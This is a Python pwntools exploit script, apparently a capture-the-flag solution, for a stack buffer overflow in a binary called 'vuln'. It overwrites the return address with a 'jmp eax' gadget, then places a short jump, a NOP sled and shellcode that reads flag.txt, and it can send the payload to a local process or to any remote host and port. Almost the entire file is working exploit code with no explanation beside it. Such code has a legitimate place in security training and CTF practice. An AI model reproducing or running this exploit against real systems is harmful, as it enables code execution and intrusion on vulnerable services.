#/usr/bin/env python3
import pwn
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--target", "-t", type=str, default="", help="Enter the host")
parser.add_argument("--port", "-p", type=int, default=0, help="Enter the port")
args = parser.parse_args()
elf = pwn.ELF('./vuln')

# new_eip  = ROPgadget --binary vuln > address
# cat address | grep ": jmp eax"
new_eip = pwn.p32(0x0805333b)
short_jump = b"\xeb\x08\x90\x90"
shell_craft = pwn.asm(pwn.shellcraft.linux.cat("flag.txt"))
offset = 24
payload = b"".join([
        b"A"*offset,
        short_jump,
        new_eip,
        b"\x90"*offset, 
        shell_craft
])
payload += b"\n" # press enter
print(payload)
if args.destination == "local":
    p = elf.process()
elif args.destination == "remote":
    if not args.target or not args.port:
        pwn.warning("Please provide target and port to connect to remote server")
        exit()
    p = pwn.remote(args.target, args.port)
p.sendline(payload)
p.interactive()
#print(p.recvall().decode("latin-1"))
